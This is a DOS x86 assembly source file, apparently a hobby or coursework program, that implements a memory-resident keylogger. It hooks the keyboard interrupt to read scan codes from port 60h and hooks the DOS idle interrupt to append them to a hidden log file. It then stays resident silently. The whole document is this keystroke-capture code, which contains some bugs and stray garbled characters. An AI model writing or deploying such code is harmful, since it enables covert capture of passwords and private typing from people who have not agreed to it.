.model tiny
.186
.data

;text: db "MAX pdr", 10, 13
 
codes db 256 dup(0)

Old28_o dw 0
Old28_s dw 0

.code
org 100h
         

INT_9		equ 	9h*4h
INT_28		equ	28h*4h

Start:
		mov bx, INT_9
		mov dx, offset New09
		call interupt_new_9
		call interupt_new_28

		call stay_resident




New09		proc
		
		push ax bx
		
		call write_scan_code
		call shine_bit
	
		mov al, 20h            ;say that interupt ended		
		out 20h, al

		pop bx ax
		
		db 0eah
Old09 		dw 0
		dw 0

		iret
		endp

;FILE_NAME: db "S:\log\loger.txt", 0

New28		proc
		push ax bx ds dx 
		pushf
	
		call open_file
		call pointer_to_end
		call write_file
		call close_file

		popf
		pop dx ds bx ax

		pushf
		call dword ptr cs:[Old28]

		
		iret
		endp
Old28 dw 0
      dw 0
;===========================================
;reads from 60 port and writes to massive
;============================================
write_scan_code	proc

		xor bx, bx
		in al, 60h

		inc codes[0]
		mov bl, codes[0]
		mov codes[bx], al
		
		ret
endp

;===============================================
;Destroy - ax
;===============================================

shine_bit 	proc

		in al, 61h		
		mov ah, al
		or al, 80h		
		out 61h, al
		mov al, ah
		out 61h, al

		ret
endp
;==============================================
;Destruct - bx, ax, es
;Input    - bx - number of interuption * 4
;         - dx - adress of NEw_interuption
;Output - Old09 - adrest of old interupt 
;===========>==================================

interupt_new_9	proc
		xor ax, ax
		mov es, ax

		cli

		mov ax, word ptr es:[bx]
		mov Old09, ax
		mov ax, word ptr es:[bx+2]
		mov Old09 + 2, ax

		mov word ptr es:[bx], dx
		mov ax, cs
		mov word ptr es:[bx+2], ax

		sti

		ret
endp

;==============================================
;Destruct - bx, ax, es
;Input    - bx - number of interuption * 4
;         - dx - adress of NEw_interuption
;Output - Old028 - adress of old interupt 
;==============================================

interupt_new_28	proc

		cli

		mov bx, INT_28
		xor ax, ax
		mov es, ax

		mov ax, word ptr es:[bx]
		mov word ptr Old28, ax
		mov ax, word ptr es:[bx + 2]
		mov word ptr Old28 + 2, ax

		mov ax, 2528h
		mov dx, offset New28
		int 21h

		sti

		ret
endp
;====================================��======
;Programm ends and stay resident
;====================================>=======

RESIDENT	equ	3100h

stay_resident	proc

		mov ax, RESIDENT
		mov dx, offset EndLabel 
		shr dx, 4
		inc dx  
		int 21h
		ret
endp

;====================================================
;Destroy - ax, bx
;Output  - bx - file handler, dx - file trail
;===================================================
OPEN		equ	3dh
FILE_NAME: db "S:\log\loger.txt", 0 

open_file	proc
		
		mov dx, offset FILE_NAME
		mov ah, OPEN
		mov al, 1
		int 21h

		mov bx, ax	
		ret
endp

;==================================================
;Input - bx - file handler
;Destroy - ax, cx, dx
;=====================================================
MOVE_POINTER	equ	42h

pointer_to_end	proc

		mov ah, MOVE_POINTER   
		mov cx, 0
		mov dx, 0	
		mov al, 2
		int 21h

		ret
endp

;==================================================
;Input - bx - file handler
;	 cx - number of bytes to write
;	 ds:dx - adress of a buffer
;Destroy - ah
;====================================================

WRITE		equ 	40h

text: db "MAX pdr", 10, 13

write_file	proc
		
		mov dx, offset codes
		mov cx, 11
		mov ah, WRITE
		int 21h

	        ret
endp

;==============================================?===
;Input - bx - filg handler
;Destroy - ah
;============��=====================================

CLOSE		equ 3eh

close_file	proc
		
		mov ah, CLOSE
		int 21h

		ret
endp

EndLabel:

End Start